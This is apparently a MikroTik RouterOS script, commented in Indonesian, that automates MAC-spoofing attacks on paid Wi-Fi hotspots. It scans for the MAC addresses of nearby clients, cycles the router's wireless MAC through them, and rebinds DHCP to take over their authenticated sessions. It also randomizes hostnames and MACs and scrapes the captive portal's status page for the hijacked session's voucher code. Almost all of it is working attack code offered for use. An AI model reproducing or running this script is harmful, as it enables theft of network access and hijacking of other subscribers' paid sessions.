:global keepAliveDelay "15";
:global nameCustomHost "f09f98912047616b2067616e676775206b6f2c2063756d61206d696e746120696e7465726e65742074657263657061742040";

:global checkFileSaveMacConnected do={ # arg input "$fileSave"
    :local txt "$1.txt" ;
    :if ([:len [/file find name=$txt]] = 0) do={
        /file print file=$1; 
        /file set $txt contents="Mac succes login" ;
    };
};

:global saveMacConnected do={ # arg input "$interface" "$fileSave"
    :local txt "$2.txt" ;
    :local currentmac [/interface wireles get [/interface wireles find name=$1] mac-address ] ;
    :local currentmacline "\n$currentmac";
    :local findmac [/file get [/file find name=$txt] contents];
    :if ([:len [:find $findmac $currentmac]] = 0) do={
        /file set $txt contents=([get $txt contents]  . $currentmacline )
    };
};

:global checkDhcpCustomHostname do={ # arg input "$interface" "nameCustomHost"
    :if ([:len [ /ip dhcp-client option find name=$1 ]] = 0) do={
        :local genhostname [pick ([/certificate scep-server otp generate minutes-valid=0 as-value]->"password") 0 16];
        /ip dhcp-client option add name=$1 code=12 value="0x$2'$genhostname'";
    };
};

:global generateDhcpCustomHostname do={ # arg input "$interface" "nameCustomHost"
    :local genhostname [pick ([/certificate scep-server otp generate minutes-valid=0 as-value]->"password") 0 16]; 
    /ip dhcp-client option set $1 value="0x$2'$genhostname'"
};

:global checkDhcpClient do={ # arg input "$interface" 
    :if ([:len [/ip dhcp-client find interface=$1]] = 0) do={
        /ip dhcp-client add interface=$1 dhcp-options="$1,clientid" use-peer-dns=no add-default-route=no disable=no ; };
};

:global removeDhcpClient do={ # arg input "$interface" 
    :while ([:len [/ip dhcp-client find interface=$1]] = 1) do={
        /ip dhcp-client remove $1
        /ip address remove  [find interface=$1]
    }; 
};

:global checkBridgeNoInternet do={ # no arg
    :if ([:len [ /interface bridge find name=spoof]] = 0) do={
        /interface bridge add name=spoof
    };
};

:global checkFailoverInterface do={ # arg input "$name" "$dstAddressCheck"
    :if ([:len [/ip route find comment="F$1"]] = 0) do={
        /ip route add dst-address=$2 gateway="spoof" distance=2 comment="F$1" check=no 
    };
};

:global resetFailoverInterface do={ # arg input "$name" 
    :if ([:len [/ip route find comment="F$1"]] = 0) do={
        /ip route disable [find comment="F$1"]
        /ip route enable [find comment="F$1"]
    };
};

:global checkRouteInterface do={ # arg input "$interface" "$name" "$gateway" "$dstAddressCheck"
    :if ([:len [/ip route find comment=$2]] = 0) do={
        /ip route add dst-address=$4 gateway="$3%$1" distance=1 comment=$2 check=arp 
    };
};

:global checkAndChangeGateway do={# arg input "$interface" "$name" "$gateway"
    :if ([/ip dhcp-client get [find interface=$1] value-name=gateway] != $3 ) do={
        :delay 5
        :local cGateway ;
        :set cGateway [/ip dhcp-client get [find interface="$1"] value-name=gateway];
        :put $cGateway ;
        :if ([:len $cGateway] != 0 ) do={
            /ip route set gateway="$cGateway%$1" [find comment=$1]
            /ip route set gateway="$cGateway%$1" [find comment=$2]
        };
    };
};

:global checkNetwatchInterface do={ # arg input "$interface"
    :if ([:len [/tool netwatch find comment=$1]] = 0) do={
        /tool netwatch add host=$6 interval=3s comment=$1
    };
};

:global checkNetwatchUnknown do={ # arg input "$interface"
    :while ([/tool netwatch get [find comment=$1] value-name=status] = "unknown") do={
        :delay 1; 
    };
};

:global removeInternetDetect do={ # no arg
    /ip dhcp-client remove [find comment="internet detect"] ;
};

:global firewallState do={ # arg input "$interface" "[state : "enable = 1" "disable = 0"]" 
    :if ($2 = 1) do={
        /system leds enable [find interface=$1]
        /ip route enable [find comment=$1]
        /ip firewall nat enable [find comment=$1]
        /ip firewall mangle enable [find comment=$1]
    };
    :if ($2 = 0) do={
        /system leds disable [find interface=$1]
        /ip route disable [find comment=$1]
        /ip firewall nat disable [find comment=$1]
        /ip firewall mangle disable [find comment=$1]
    };
};

:global scanMode do={ # arg input "$interface" "$mode"
    :if ($2 = 1) do={
        :global randomMac;
        $randomMac $1
    };
};

:global keepAliveInternetConnected do={ # arg input "$interface" "$keepAliveDelay"
    :global generateDhcpCustomHostname;
    :while ([/tool netwatch get [find comment=$1] value-name=status] = "up") do={
        :delay $2;
        $generateDhcpCustomHostname $1 $3
    };
};

:global changeMacAddress do={ # arg input "$interface" "$macAddress"
    :if ([:len [/interface wireless find mac-address=$2]] = 0) do={
        /interface wireless disable $1
        /interface wireless set $1 mac-address=$2
        /interface wireless enable $1
    };
};

:global addDhcpAntiStuck do={ # arg input "$interface" "$name"
    :do {
        /system scheduler add disabled=no interval=20s name="dhcp$2" on-event=":if ([/ip dhcp-client get [find interface=\
            $1]  status] = \"searching...\" ) do={ \r\
            \n    /interface wireless set $1 mac-address=00:00:00:00:00:26 \r\
            \n};\r\
            \n" policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon \
            start-time=startup
    } on-error={ 
        :put "eror addDhcpAntiStuck" 
    };
};

:global removeDhcpAntiStuck do={ # arg input "$name"
    :do {
        /system scheduler remove "dhcp$1";
    } on-error={ 
        :put "eror removeDhcpAntiStuck" 
    };
};

:global waitingDhcpBound do={ # arg input "$interface"
    :while ([/ip dhcp-client get [find interface=$1] status] != "bound" ) do={
        :delay 2;
        :while ([:len [/ip dhcp-client find interface=$1]] = 0) do={
            /ip dhcp-client add interface=$1 dhcp-options="$1,clientid" use-peer-dns=yes add-default-route=no disable=no ;
            :put "missing dhcp client...";
        };
    };
};

:global randomnum do={
    /system resource irq
    :local tmpsum 0
    :foreach i in=[find] do={:set tmpsum ($tmpsum + [get $i count])}
    :set   tmpsum [:tostr $tmpsum]
    :local lentmp [:len   $tmpsum]
    :return [:tonum [:pick $tmpsum ($lentmp - 2) $lentmp]]
};

:global randomMac do={ # arg input "$interface" 
    :global randomnum ;
    :global waitingDhcpBound ;
    :global changeMacAddress ;
    :global generateDhcpCustomHostname ;
    :local arrhex [:toarray "0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F"]
    :local rndmac ; :local tmp
    :for x from=1 to=12 step=1 do={
        :set tmp ([$randomnum] % 16)
        # this makes it always a valid MAC
        :if ($x =  2) do={:set tmp (($tmp | 0x2) & 0xE)}
        :set rndmac "$rndmac$($arrhex->$tmp)"
        :if ([:tostr [:len $rndmac]] ~ "(2|5|8|11|14)") do={:set rndmac "$rndmac:"}
    };
    :put  $rndmac;
    :do { $generateDhcpCustomHostname $1 4e} on-error={:put "error generateDhcpCustomHostname"};
    :do { $changeMacAddress $1 $rndmac } on-error={:put "error changeMacAddress"};
    :do { $waitingDhcpBound $1 } on-error={:put "error waitingDhcpBound"};
};

:global sortMac do={# arg input "$filemac"
    :local filesave "$1"
    :local content [/file get [/file find name=console-dump.txt] contents];
    :if ([:len [/file find name=$filesave]] = 0) do={
        /file add name=$filesave
    };
    :local lineEnd 0; :local lastEnd 141; :local mac ""; :local macline "";:local findmac "";
    :while ($lineEnd < [:len $content]) do={

        :set lineEnd [:find $content "\n" $lastEnd];
        :if ([:len $lineEnd] = 0) do={
        :set lineEnd [:len $content];
        } else={
        :set lineEnd ($lineEnd - 20);
        :set mac [:pick $content $lastEnd $lineEnd];
        :set lineEnd ($lineEnd + 20);
        :set lastEnd ($lineEnd + 1);
        };

        :set findmac [/file get [/file find name=$filesave] contents];
        :if ([:len [:find $findmac $mac]] = 0) do={
            :set macline "\n$mac";
            /file set $filesave contents=([get $filesave contents]  .$macline )
            :put "-> $mac saving to list up ... " ;
        };

    }
    :do { /file remove console-dump.txt } on-error={:put "error remove console-dump.txt"};
    
};


:global scan do={
:local target "wlan3"
:local targetp "$target.txt"
:global sortMac

:put "mematikan semua job spoof"
/system scheduler disable [find name=spoof]
/system script job remove [find script=spoof1]
/system script job remove [find script=spoof2]
/system script job remove [find script=spoof3]
:delay 2

:put "ketik D  dan Q setelah selesai menscan"
:delay 2
/tool mac-scan $target proplist=mac
:delay 2


:put "Parsing Mac"
$sortMac $targetp

/system scheduler enable [find name=spoof]
};

:global fvoucher do={

:local gate [/ip dhcp-client get [find interface=$1] value-name=gateway];
:local scr [/ip dhcp-client get [find interface=$1] value-name=address];
:local nmask [:find $scr "/"];
:local srcaddr [:pick $scr 0 $nmask];
:local url "http://$gate/status";
:local fetchResult;
:local response;
:local data;
:local startPos;
:local endPos;
:local voucherCode;
:put " $gate $srcaddr ";

:set fetchResult [/tool fetch url=$url mode=http as-value output=user src-address=$srcaddr];
:if ($fetchResult -> "status" = "finished") do={
    :set data ($fetchResult -> "data");

    # Find the start position of the voucher code
    :set startPos [:find $data "<h1>Hi, "];
    :set endPos [:find $data "!</h1>"];

    # Check if the voucher code header exists
    :if ($startPos != "") do={
        :set startPos ($startPos + 8);
        :set endPos ($endPos);

        :set voucherCode [:pick $data $startPos $endPos];

        :put $voucherCode;
    } else={
        :put "Voucher code not found";
    }
} else={
    :put [$fetchResult -> "status"];
};
};


######### MAIN #########

:global main do={
:local name $1;
:local mode $2;
:local interface $3;
:local macList $4;
:local fileSave $5;
:local dstAddressCheck $6;
:local gateway $7;

# load all environment
:global checkFileSaveMacConnected;
:global saveMacConnected;
:global checkDhcpCustomHostname;
:global generateDhcpCustomHostname;
:global checkDhcpClient;
:global removeDhcpClient;
:global checkBridgeNoInternet;
:global checkFailoverInterface;
:global checkRouteInterface;
:global checkAndChangeGateway;
:global checkNetwatchInterface;
:global checkNetwatchUnknown;
:global removeInternetDetect;
:global firewallState;
:global scanMode;
:global keepAliveInternetConnected;
:global changeMacAddress;
:global addDhcpAntiStuck;
:global removeDhcpAntiStuck;
:global waitingDhcpBound;
:global nameCustomHost;
:global keepAliveDelay;
:global resetFailoverInterface;
:local interfaces $interface;

# configuration check
:put "Starting configuration checks...";
:do { $removeInternetDetect } on-error={:put "Error removing internet detect"};
:do { $removeDhcpAntiStuck $name } on-error={:put "Error removing DHCP anti-stuck"};
:do { $checkFileSaveMacConnected $fileSave } on-error={:put "Error checking file save for MAC connected"};
:do { $checkDhcpCustomHostname $interface $nameCustomHost } on-error={:put "Error checking DHCP custom hostname"};
:do { $checkDhcpClient $interface } on-error={:put "Error checking DHCP client"};
:do { $checkBridgeNoInternet } on-error={:put "Error checking bridge no internet"};
:do { $checkFailoverInterface $name $dstAddressCheck } on-error={:put "Error checking failover interface"};
:do { $checkRouteInterface $interface $name $gateway $dstAddressCheck } on-error={:put "Error checking route interface"};
:do { $checkNetwatchInterface $interface } on-error={:put "Error checking netwatch interface"};
:put "Configuration checks complete.";


:local fileContent [/file get [/file find name=$macList] contents]
:local isValidMac do={
    :local mac [$1]
    :return ([:len $mac] = 17 && [:pick $mac 2 3] = ":" && [:pick $mac 5 6] = ":" && [:pick $mac 8 9] = ":" && [:pick $mac 11 12] = ":" && [:pick $mac 14 15] = ":")
}

:local start 0
:local counter 0
:local line ""
:local macAddress ""
:local end [:find $fileContent "\n" $start]

:while ($end != -1) do={
    :set line [:pick $fileContent $start $end]
    :set start ($end + 1)
    :set end [:find $fileContent "\n" $start]

    :set macAddress [:pick $line 0 17]
    :if ([$isValidMac $macAddress]) do={
        :set counter ($counter + 1)
        :put "Checking netwatch unknown status...";
        :do { $checkNetwatchUnknown $interface } on-error={:put "Error checking netwatch unknown status"};


        :if ([/tool netwatch get [find comment=$interfaces] value-name=status] = "up") do={
            :if ([/ip dhcp-client get [find interface=$interfaces] status] = "bound") do={
                :put "DHCP Client status is bound.";
                :do { $firewallState $interface 1 } on-error={:put "Error enabling firewall state"};
                :do { $saveMacConnected $interface $fileSave } on-error={:put "Error saving MAC address"};
                :do { $scanMode $interface $mode } on-error={:put "Error running scan mode"};
                :do { $keepAliveInternetConnected $interface $keepAliveDelay $nameCustomHost } on-error={:put "Error keeping alive internet connection"};
            };
        };
        
        :put "Resetting failover interface...";
        :do { $resetFailoverInterface $name } on-error={:put "Error resetting failover interface"};
        :put "Generating DHCP custom hostname...";
        :do { $generateDhcpCustomHostname $interface $nameCustomHost } on-error={:put "Error generating DHCP custom hostname"};
        :put "Disabling firewall state...";
        :do { $firewallState $interface 0 } on-error={:put "Error disabling firewall state"};
        :put "Changing MAC address...";
        :do { $changeMacAddress $interface $macAddress } on-error={:put "Error changing MAC address"};
        :put ""
        :put "$counter $macAddress"
        :put "Removing DHCP client...";
        :do { $removeDhcpClient $interface } on-error={:put "Error removing DHCP client"};
        :put "Removing internet detect...";
        :do { $removeInternetDetect } on-error={:put "Error removing internet detect"};
        :put "Checking DHCP client again...";
        :do { $checkDhcpClient $interface } on-error={:put "Error checking DHCP client"};
        :put "Adding DHCP anti-stuck...";
        :do { $addDhcpAntiStuck $interface $name } on-error={:put "Error adding DHCP anti-stuck"};
        :put "Waiting for DHCP bound...";
        :do { $waitingDhcpBound $interface } on-error={:put "Error waiting for DHCP bound"};
        :put "Removing DHCP anti-stuck...";
        :do { $removeDhcpAntiStuck $name } on-error={:put "Error removing DHCP anti-stuck"};
        #:do { $checkAndChangeGateway $interface $name $gateway } on-error={:put "error checkAndChangeGateway"};
        :put "Resetting failover interface...";
        :do { $resetFailoverInterface $name } on-error={:put "Error resetting failover interface"};
        :delay 5;
    }
}
};
